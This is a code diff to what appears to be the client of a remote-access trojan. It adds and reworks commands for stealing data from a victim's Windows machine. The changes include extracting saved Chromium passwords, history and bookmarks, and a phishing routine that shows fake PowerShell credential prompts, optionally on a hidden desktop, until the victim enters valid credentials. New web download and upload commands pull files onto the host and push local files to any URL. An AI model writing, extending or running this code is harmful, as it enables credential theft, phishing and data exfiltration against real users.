@@ -4,12 +4,13 @@ import io
 import json
 import os
 import shlex
+import shutil
 import subprocess
 import time
 from functools import wraps
 from pathlib import Path
 
-from common.util import logger, get_time, format_dict, parse, parse_args
+from common.util import logger, get_time, format_dict, parse, parse_args, parse_kwargs
 
 if os.name == 'nt':
     from client.win32util import *
@@ -34,6 +35,21 @@ def params(arg_list):
         @wraps(func)
         def wrapper(*args, **kwargs):
             arg_dict = parse_args(arg_list, shlex.split(args[0]))
+            for key in arg_dict:
+                setattr(func, key, arg_dict[key])
+            return func(func, *args, **kwargs)
+
+        wrapper.__signature__ = inspect.signature(func)
+        return wrapper
+
+    return attr_decorator
+
+
+def params_kwargs(arg_list):
+    def attr_decorator(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            arg_dict = parse_kwargs(arg_list, shlex.split(args[0]))
             for key in arg_dict:
                 setattr(func, key, arg_dict[key])
             return func(func, *args, **kwargs)
@@ -415,7 +431,7 @@ ShortSvcName="flcVPN"
 
     @staticmethod
     @desc('extract data from browser')
-    @params(['browser', 'data'])
+    @params(['browser', 'type'])
     def browser(this, args):
         home = os.path.expanduser('~')
         profile_paths = {
@@ -432,17 +448,17 @@ ShortSvcName="flcVPN"
         login_data = os.path.join(default, 'Login Data')
         bookmarks = os.path.join(default, 'Bookmarks')
         history = os.path.join(default, 'History')
-        if this.data == 'password':
+        if this.type == 'password':
             return 1, json.dumps(get_chromium_passwords(get_master_key(local_state), login_data),
                                  sort_keys=False,
                                  indent=2,
                                  ensure_ascii=False)
-        elif this.data == 'bookmark':
+        elif this.type == 'bookmark':
             return 1, json.dumps(get_chromium_bookmarks(bookmarks), indent=2, ensure_ascii=False)
-        elif this.data == 'history':
+        elif this.type == 'history':
             return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
         else:
-            return 0, 'Error: {}'.format(this.data)
+            return 0, 'Error: {}'.format(this.type)
 
     @staticmethod
     @desc('prompt for credentials')
@@ -450,27 +466,43 @@ ShortSvcName="flcVPN"
     def cred(args):
 
         @desc('PSHostUserInterface.PromptForCredential')
-        def pshostui():
-            while True:
-                p = subprocess.Popen(
-                    'powershell.exe '
-                    '$cred=$Host.UI.PromptForCredential(\'\',\'\',$env:username,\'\');'
-                    'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} else {echo `n}',
-                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                stdout, stderr = p.communicate()
-                if stderr:
-                    return 0, stderr.decode(locale.getdefaultlocale()[1])
-                lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
-                if logon_user(*lines):
-                    return 1, str(lines)
+        def pshostui(option):
+            command = r'$cred=$Host.UI.PromptForCredential($null,$null,$env:username,$null);' \
+                      'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} ' \
+                      'else {echo `n} '
+            if option == '--create-desktop':
+                try:
+                    create_desktop()
+                    while 1:
+                        status, result = create_process(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
+                                                        f' {command}')
+                        if not status:
+                            raise Exception(result)
+                        lines = result.splitlines()
+                        if logon_user(*lines):
+                            switch_default()
+                            return 1, str(lines)
+                except:
+                    switch_default()
+                    raise
+            else:
+                while True:
+                    p = subprocess.Popen(f'powershell.exe {command}', stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                         shell=True)
+                    stdout, stderr = p.communicate()
+                    if stderr:
+                        return 0, stderr.decode(locale.getdefaultlocale()[1])
+                    lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
+                    if logon_user(*lines):
+                        return 1, str(lines)
 
-        @desc('CredentialPicker')
+        @desc('Windows.Security.Credentials.UI.CredentialPicker')
         def credpicker():
             server = Command.server
             filename = os.path.abspath(r'external\Cred.ps1')
             if not os.path.isfile(filename):
                 return 0, f'File does not exist: {filename}'
-            p = subprocess.Popen(r'powershell.exe -ep bypass -file "{}"'.format(filename), stdout=subprocess.PIPE,
+            p = subprocess.Popen(rf'powershell.exe -ep bypass -file "{filename}"', stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, shell=True)
             stdout, stderr = p.communicate()
             if stderr:
@@ -478,25 +510,6 @@ ShortSvcName="flcVPN"
                 return
             lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
             server.send_result(1, str(lines), id=Command.id, eof=1)
-
-        @desc('switch to new desktop')
-        def new_desktop():
-            try:
-                create_desktop()
-                while True:
-                    status, result = create_process(
-                        r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
-                        ' $cred=$Host.UI.PromptForCredential(\'\',\'\',$env:username,\'\');'
-                        'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} else {echo `n}')
-                    if not status:
-                        raise Exception(result)
-                    lines = result.splitlines()
-                    if logon_user(*lines):
-                        switch_default()
-                        return 1, f'username: {lines[0]}\npassword: {lines[1]}'
-            except:
-                switch_default()
-                raise
 
         return locals()
 
@@ -576,3 +589,40 @@ ShortSvcName="flcVPN"
             return 0, f'File does not exist: {zip_name}'
         shutil.unpack_archive(zip_name, os.getcwd())
         return 1, f'Archive extracted to {os.getcwd()}'
+
+    @staticmethod
+    @params_kwargs([
+        [['url'], {'type': str, 'nargs': '*'}],
+        [['-o'], {'type': str, 'nargs': '*', 'required': False}],
+    ])
+    def web_download(this, args):
+        if not this.url:
+            return 0, 'No URL provided'
+        import requests
+        with requests.get(this.url, stream=True) as resp:
+            if resp.status_code == 200:
+                local_filename = os.path.abspath(this.o if this.o else os.path.basename(this.url))
+                with open(local_filename, 'wb') as f:
+                    shutil.copyfileobj(resp.raw, f)
+                return 1, f'File downloaded: {local_filename}'
+            else:
+                return 0, str(resp.status_code)
+
+    @staticmethod
+    @params_kwargs([
+        [['url'], {'type': str, 'nargs': '*'}],
+        [['--file', '-f'], {'type': str, 'nargs': '*', 'required': True}],
+        [['--form_data_key', '-k'], {'type': str, 'nargs': '*', 'required': False, 'default': 'file'}],
+        [['--cookies', '-c'], {'type': str, 'nargs': '*', 'required': False}]
+    ])
+    def web_upload(this, args):
+        if not this.url:
+            return 0, 'No URL provided'
+        import requests
+        filename = os.path.abspath(this.file)
+        if not os.path.isfile(filename):
+            return 0, f'File does not exist: {filename}'
+        with open(filename, 'rb') as f:
+            with requests.post(this.url, files={this.form_data_key: f},
+                               cookies=json.loads(this.cookies) if this.cookies else None) as resp:
+                return 1, resp.text
